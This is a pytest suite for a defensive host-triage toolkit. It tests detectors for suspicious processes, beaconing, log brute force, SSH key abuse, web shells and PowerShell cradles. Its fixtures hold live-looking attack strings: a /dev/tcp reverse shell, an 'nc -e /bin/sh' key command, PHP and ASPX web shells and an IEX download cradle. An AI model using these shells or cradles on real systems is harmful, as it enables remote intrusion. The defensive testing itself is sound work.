import argparse
import base64
import json
import os
import struct
import subprocess
import sys
from datetime import datetime, timedelta

import pytest

import btcommon
from conftest import SCRIPTS


def ns(**kw):
    defaults = {"json": False, "min_severity": "info", "rules": None}
    defaults.update(kw)
    return argparse.Namespace(**defaults)


def run_script(name, *args, env=None):
    proc = subprocess.run(
        [sys.executable, str(SCRIPTS / f"{name}.py"), *args],
        capture_output=True, text=True, env={**os.environ, **(env or {})}, timeout=120,
    )
    return proc


# --- process_monitor ---------------------------------------------------------------


@pytest.mark.parametrize("name", ["launchd", "rsync", "syncthing", "vncserver", "dbus-launch", "python3", "powershell.exe"])
def test_process_monitor_no_substring_false_positives(name):
    # Regression: "nc" used to match any name containing those letters.
    from process_monitor import classify

    names = set(btcommon.load_rules("process_monitor")["suspicious_names"])
    proc = btcommon.Process(1, 0, name)
    assert classify(proc, names, []) is None


def test_process_monitor_flags_exact_names_and_cmdlines():
    from process_monitor import classify

    names = set(btcommon.load_rules("process_monitor")["suspicious_names"])
    patterns = btcommon.compile_patterns(btcommon.load_rules("commands")["patterns"])
    assert classify(btcommon.Process(1, 0, "ncat"), names, patterns)[0] == "medium"
    assert classify(btcommon.Process(1, 0, "certutil.exe"), names, patterns)[0] == "medium"
    shell = btcommon.Process(1, 0, "bash", cmdline="bash -i >& /dev/tcp/1.2.3.4/443 0>&1")
    assert classify(shell, names, patterns)[0] == "high"


# --- network_beacon_watch -----------------------------------------------------------


def test_beacon_candidates_regular_interval():
    from network_beacon_watch import beacon_candidates

    key = ("203.0.113.9", 443, "implant")
    regular = {key: [60.0, 120.0, 181.0, 240.0, 300.0]}
    (hit,) = beacon_candidates(regular, sample_interval=10, min_events=4, max_jitter=0.2)
    assert hit[0] == key and 55 < hit[1] < 65


def test_beacon_candidates_ignores_irregular_and_busy():
    from network_beacon_watch import beacon_candidates

    irregular = {("a", 1, "x"): [10.0, 15.0, 90.0, 95.0, 300.0]}
    assert beacon_candidates(irregular, 5, 4, 0.2) == []
    # A new connection in every sample only reflects the sampling rate.
    busy = {("b", 1, "y"): [10.0, 20.0, 30.0, 40.0, 50.0]}
    assert beacon_candidates(busy, 10, 4, 0.2) == []


# --- file_hash_audit ------------------------------------------------------------------


@pytest.mark.skipif(os.name != "posix", reason="POSIX permissions")
def test_file_hash_compare_statuses(tmp_path):
    from file_hash_audit import compare, snapshot

    (tmp_path / "a").write_text("a")
    (tmp_path / "b").write_text("b")
    errors = []
    before = snapshot([str(tmp_path)], errors)
    (tmp_path / "a").write_text("changed")
    (tmp_path / "b").chmod(0o600)
    (tmp_path / "c").write_text("new")
    after = snapshot([str(tmp_path)], errors)
    (tmp_path / "gone").write_text("x")
    statuses = {(status, os.path.basename(path)) for status, path, _ in compare(before, after)}
    # Regression: new files used to be reported as CHANGED.
    assert statuses == {("CHANGED", "a"), ("PERMS", "b"), ("ADDED", "c")}
    assert {s for s, _, _ in compare(after, before)} >= {"REMOVED"}


def test_file_hash_accepts_v1_baseline(tmp_path):
    from file_hash_audit import compare, snapshot

    (tmp_path / "a").write_text("a")
    current = snapshot([str(tmp_path)], [])
    path, entry = next(iter(current.items()))
    assert compare({path: entry["sha256"]}, current) == []
    assert compare({path: "0" * 64}, current)[0][0] == "CHANGED"


@pytest.mark.skipif(os.name != "posix", reason="POSIX permissions")
def test_file_hash_audit_survives_unreadable_files(tmp_path):
    (tmp_path / "ok").write_text("x")
    secret = tmp_path / "secret"
    secret.write_text("y")
    secret.chmod(0)
    try:
        proc = run_script("file_hash_audit", str(tmp_path), "--json")
        # Regression: a PermissionError used to crash the whole run.
        doc = json.loads(proc.stdout)
        assert any(f["data"].get("path", "").endswith("ok") for f in doc["findings"])
    finally:
        secret.chmod(0o644)


def test_file_hash_cache_reuses_unchanged_entries(tmp_path):
    from file_hash_audit import snapshot

    (tmp_path / "a").write_text("a")
    cache = {}
    first = snapshot([str(tmp_path)], [], cache)
    second = snapshot([str(tmp_path)], [], cache)
    key = next(iter(first))
    assert first[key] is second[key]


# --- log_triage ---------------------------------------------------------------------

AUTH_LOG = [f"Sep 29 10:00:{i:02d} host sshd[1]: Failed password for invalid user admin from 198.51.100.7 port 4{i} ssh2" for i in range(12)] + [
    "Sep 29 10:01:00 host sshd[1]: Accepted password for bob from 198.51.100.7 port 5000 ssh2",
    "Sep 29 10:02:00 host useradd[9]: new user: name=backdoor, UID=0, GID=0",
    "Sep 29 10:03:00 host sudo: alice : 3 incorrect password attempts ; TTY=pts/0 ; COMMAND=/bin/bash",
    "Sep 29 10:04:00 host CRON[5]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)",
    "Sep 29 10:05:00 host sshd[1]: Accepted publickey for root from 203.0.113.5 port 1 ssh2",
]


def test_log_triage_detects_bruteforce_and_success_after_it():
    from log_triage import classify_linux, summarize

    rules = btcommon.load_rules("log_triage")
    triage = classify_linux(AUTH_LOG, rules["linux_patterns"], rules["linux_ignore"])
    report = btcommon.Report("log_triage", ns())
    summarize(report, triage, threshold=10, limit=10)
    by_check = {}
    for f in report.findings:
        by_check.setdefault(f.check, []).append(f)
    assert by_check["authentication failures"][0].severity == "high"
    assert "198.51.100.7" in by_check["compromise indicators"][0].message
    assert by_check["account_change"][0].severity == "medium"
    assert by_check["sudo_failure"][0].severity == "medium"
    assert by_check["root_login"][0].severity == "medium"
    assert not any("CRON" in f.message for f in report.findings)


def test_windows_event_description_uses_structured_fields():
    from log_triage import describe_windows_event

    event = btcommon.WinEvent(4625, "2026-09-29T10:00:00", "Security", "Falha ao iniciar sessão",
                              {"TargetUserName": "admin", "IpAddress": "198.51.100.7", "LogonType": "3", "SubjectUserName": "-"})
    text = describe_windows_event(event, "Failed logon")
    assert "user=admin" in text and "from=198.51.100.7" in text and "logon_type=3" in text
    assert "by=" not in text


# --- scheduled_task_audit ---------------------------------------------------------------


def test_cron_lines_skip_comments_and_variables():
    from scheduled_task_audit import cron_lines

    text = "# comment\nSHELL=/bin/sh\nPATH=/usr/bin\n\n*/5 * * * * root   /usr/bin/true\n@reboot  /tmp/.x\n"
    assert cron_lines(text) == ["*/5 * * * * root /usr/bin/true", "@reboot /tmp/.x"]


# --- serviceup -------------------------------------------------------------------------


def test_serviceup_parses_failed_units_with_bullet():
    from serviceup import parse_systemctl_units

    output = (
        "● auditd.service    not-found inactive dead  auditd.service\n"
        "  ssh.service       loaded    active   running OpenBSD Secure Shell server\n"
        "  foo.service       loaded    failed   failed  Foo\n"
    )
    # Regression: the name used to be read as "●".
    assert parse_systemctl_units(output) == {"auditd.service": "inactive", "ssh.service": "active", "foo.service": "failed"}


def test_serviceup_parses_sc_query():
    from serviceup import parse_sc_query

    output = "SERVICE_NAME: Spooler\n        TYPE               : 110  WIN32_OWN_PROCESS\n        STATE              : 4  RUNNING\n"
    assert parse_sc_query(output) == {"Spooler": "running"}


# --- web root / downloads ---------------------------------------------------------------


def test_web_root_scan(tmp_path):
    import re

    from suspicious_web_root_scan import scan_file

    rules = btcommon.load_rules("suspicious_web_root_scan")
    rules["script_extensions"] = set(rules["script_extensions"])
    rules["image_extensions"] = set(rules["image_extensions"])
    markers = [(re.compile(m["pattern"], re.I), m["severity"]) for m in rules["markers"]]
    cutoff = datetime.now() - timedelta(days=7)
    (tmp_path / "uploads").mkdir()
    # Built at runtime so antivirus does not flag this test file itself. Antivirus may still
    # block the generated files; the scanner then reports them as unreadable (medium).
    php = "<" + "?php "
    cases = {
        "shell.php": (php + "ev" + "al(base64" + "_decode($_PO" + "ST['x'])); ?>", {"high", "medium"}),
        "cmd.aspx": ('<% Process.Start("cmd.exe", Request.Form["c"]) %>', {"low", "medium"}),
        "uploads/cat.gif": ("GIF89a" + php + "sys" + "tem($_G" + "ET['c']); ?>", {"high", None}),
        "uploads/a.php": (php + "echo 1;", {"medium"}),
        "style.css": ("body{}", {None}),
    }
    for rel, (content, _) in cases.items():
        try:
            (tmp_path / rel).write_text(content)
        except OSError:
            pass  # blocked by antivirus on write
    for rel, (_, expected) in cases.items():
        if not (tmp_path / rel).exists():
            continue  # removed by antivirus
        hit = scan_file(tmp_path / rel, rules, markers, cutoff)
        assert (hit[0] if hit else None) in expected, rel


def test_double_extension():
    from browser_download_audit import double_extension

    rules = btcommon.load_rules("browser_download_audit")
    decoys, exes = set(rules["decoy_extensions"]), set(rules["executable_extensions"])
    assert double_extension("fatura.pdf.exe", decoys, exes)
    assert double_extension("Invoice.DOCX.scr", decoys, exes)
    assert not double_extension("setup.exe", decoys, exes)
    assert not double_extension("archive.tar.gz", decoys, exes)


# --- dns ------------------------------------------------------------------------------


def test_dga_heuristic():
    from dns_cache_audit import looks_generated

    assert looks_generated("xj4k9qpz7w2m8v1rtb6n.com", 16, 3.8)
    assert not looks_generated("www.google.com", 16, 3.8)
    assert not looks_generated("login.microsoftonline.com", 16, 3.8)


# --- ssh ------------------------------------------------------------------------------


def _rsa_blob(bits):
    def field(b):
        return struct.pack(">I", len(b)) + b
    modulus = b"\x00" + b"\xff" * (bits // 8)
    return base64.b64encode(field(b"ssh-rsa") + field(b"\x01\x00\x01") + field(modulus)).decode()


def test_authorized_keys_parsing():
    from ssh_key_audit import parse_authorized_keys

    text = "\n".join([
        f"ssh-rsa {_rsa_blob(1024)} weak@host",
        'command="/bin/nc -e /bin/sh 1.2.3.4 4444",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA bob@x',
        "# comment",
        "garbage line",
    ])
    keys = parse_authorized_keys(text)
    assert keys[0]["bits"] == 1024 and keys[0]["comment"] == "weak@host"
    assert keys[1]["options"].startswith('command="/bin/nc') and keys[1]["type"] == "ssh-ed25519"
    assert keys[2]["invalid"]


def test_sshd_settings_first_value_wins_and_match_ignored(tmp_path):
    from ssh_key_audit import sshd_settings

    cfg = tmp_path / "sshd_config"
    cfg.write_text("PermitRootLogin yes\nPermitRootLogin no\nMatch User bob\n  PasswordAuthentication yes\n")
    settings = sshd_settings([cfg])
    assert settings["permitrootlogin"][0] == "yes"
    assert "passwordauthentication" not in settings


# --- accounts / suid -------------------------------------------------------------------


def test_sudoers_rules_join_continuations():
    from account_audit import sudoers_rules

    text = "# c\nDefaults env_reset\nbob ALL=(ALL) \\\n  NOPASSWD: ALL\n#includedir /etc/sudoers.d\n"
    assert sudoers_rules(text) == ["Defaults env_reset", "bob ALL=(ALL) NOPASSWD: ALL", "#includedir /etc/sudoers.d"]


def test_parse_passwd_and_group():
    from account_audit import parse_group_members, parse_passwd

    users = parse_passwd("root:x:0:0:root:/root:/bin/bash\ntoor:x:0:0::/root:/bin/sh\n")
    assert [u["uid"] for u in users] == [0, 0]
    assert parse_group_members("sudo:x:27:alice,bob\nusers:x:100:\n", {"sudo"}) == {"sudo": ["alice", "bob"]}


def test_parse_getcap_both_formats():
    from suid_audit import base_name, parse_getcap

    output = "/usr/bin/ping cap_net_raw=ep\n/usr/bin/python3.11 = cap_setuid+ep\n"
    assert parse_getcap(output) == [("/usr/bin/ping", "cap_net_raw=ep"), ("/usr/bin/python3.11", "cap_setuid+ep")]
    assert base_name("/usr/bin/python3.11") == "python"


def test_taint_reasons():
    from ld_preload_check import taint_reasons

    assert taint_reasons(0) == []
    assert "unsigned module loaded" in taint_reasons(1 << 13)


# --- windows helpers (pure logic) ---------------------------------------------------------


def test_unquoted_service_path():
    from startup_audit import unquoted_service_path

    assert unquoted_service_path(r"C:\Program Files\Vendor App\svc.exe -k run")
    assert not unquoted_service_path(r'"C:\Program Files\Vendor App\svc.exe"')
    assert not unquoted_service_path(r"C:\Windows\system32\svchost.exe -k netsvcs")


def test_defender_status_evaluation():
    from defender_status import evaluate_status, exclusions

    problems = evaluate_status({"RealTimeProtectionEnabled": False, "AntivirusSignatureAge": 9, "AMRunningMode": "Passive Mode"}, 3)
    severities = sorted(s for s, _ in problems)
    assert severities == ["high", "medium", "medium"]
    pref = {"ExclusionPath": ["C:\\Users\\Public"], "ExclusionProcess": "evil.exe", "ExclusionExtension": ["N/A: Must be an administrator to view exclusions"]}
    assert exclusions(pref) == [("ExclusionPath", "C:\\Users\\Public"), ("ExclusionProcess", "evil.exe")]


def test_powershell_block_detection():
    from powershell_logging_audit import GENERATED_MODULE, suspicious_block

    patterns = btcommon.compile_patterns(btcommon.load_rules("powershell_logging_audit")["suspicious_patterns"])
    assert suspicious_block("IEX (New-Object Net.WebClient).DownloadString('http://x')", patterns)
    assert suspicious_block("powershell -ep bypass -file x.ps1", patterns)
    assert suspicious_block("$x = '" + "A" * 500 + "'", patterns)
    assert suspicious_block("Get-ChildItem C:\\ | Sort-Object Length", patterns) is None
    # Regression: 'ProxyBypass' in Defender's generated module is not an execution-policy bypass.
    assert suspicious_block("[string[]] ${ProxyBypass}", patterns) is None
    assert GENERATED_MODULE == "$__cmdletization_"


def test_process_tree_rules():
    from process_tree_audit import check_expected_parents, check_pairs

    rules = btcommon.load_rules("process_tree_audit")
    procs = [
        btcommon.Process(10, 1, "WINWORD.EXE"),
        btcommon.Process(11, 10, "powershell.exe", cmdline="powershell -enc AAA"),
        btcommon.Process(20, 1, "nginx"),
        btcommon.Process(21, 20, "sh"),
        btcommon.Process(30, 1, "explorer.exe"),
        btcommon.Process(31, 30, "lsass.exe"),
        btcommon.Process(40, 1, "bash"),
        btcommon.Process(41, 40, "ls"),
    ]
    hits = {(p.name, c.name) for _, p, c in check_pairs(procs, rules["rules"])}
    assert hits == {("WINWORD.EXE", "powershell.exe"), ("nginx", "sh")}
    expected = {k: v for k, v in rules["expected_parents"].items() if not k.startswith("_")}
    assert [(p.name, parent) for p, parent in check_expected_parents(procs, expected)] == [("lsass.exe", "explorer.exe")]


# --- ioc_sweep / forwarder ---------------------------------------------------------------


@pytest.mark.parametrize(
    "value,expected",
    [
        ("44d88612fea8a8f36de82e1278abb02f", "md5"),
        ("E" * 64, "sha256"),
        ("198.51.100[.]7", "ip"),
        ("2001:db8::1", "ip"),
        ("evil[.]duckdns[.]org", "domain"),
        ("hxxps://bad.example.com/payload", "domain"),
        ("invoice.pdf.exe", "filename"),
        ("C:\\Users\\Public\\x.exe", "path"),
    ],
)
def test_ioc_classify(value, expected):
    from ioc_sweep import classify

    assert classify(value)[0] == expected


def test_log_forwarder_reads_reports_and_json_lines():
    from log_forwarder import flatten, iter_documents, syslog_message

    report = json.dumps({"tool": "t", "host": "h", "findings": [{"check": "c", "severity": "high", "message": "m", "data": {}}]}, indent=2)
    lines = '{"tool": "hashwatch_daemon", "severity": "medium", "status": "CHANGED", "path": "/etc/x", "detail": "content"}\n'
    docs = list(iter_documents([report, "\n", lines]))
    records = [r for d in docs for r in flatten(d)]
    assert [r["severity"] for r in records] == ["high", "medium"]
    assert "CHANGED /etc/x" in records[1]["message"]
    assert syslog_message(records[0]).startswith(b"<130>1 ")


# --- triage_all -------------------------------------------------------------------------


def test_triage_render_markdown_and_html():
    from triage_all import render_html, render_markdown

    results = [
        {"tool": "a", "exit_code": 1, "summary": {"info": 0, "low": 0, "medium": 0, "high": 1}, "findings": [{"check": "c", "severity": "high", "message": "<bad> & worse"}], "errors": [], "duration": 1},
        {"tool": "b", "exit_code": 2, "findings": [], "errors": ["broken"], "duration": 0},
    ]
    meta = {"host": "h", "timestamp": "t", "os": "o", "privileged": False}
    md = render_markdown(results, meta)
    assert "| a | findings | 1 |" in md and "## High findings (1)" in md and "**b**: broken" in md
    html = render_html(results, meta)
    assert "&lt;bad&gt; &amp; worse" in html and "<bad>" not in html


def test_every_script_has_help_and_json_where_expected():
    scripts = sorted(p.stem for p in SCRIPTS.glob("*.py") if p.stem not in {"btcommon"})
    for name in scripts:
        proc = run_script(name, "--help")
        assert proc.returncode == 0, (name, proc.stderr)


def test_triage_all_list_runs():
    proc = run_script("triage_all", "--list")
    assert proc.returncode == 0 and "process_monitor" in proc.stdout
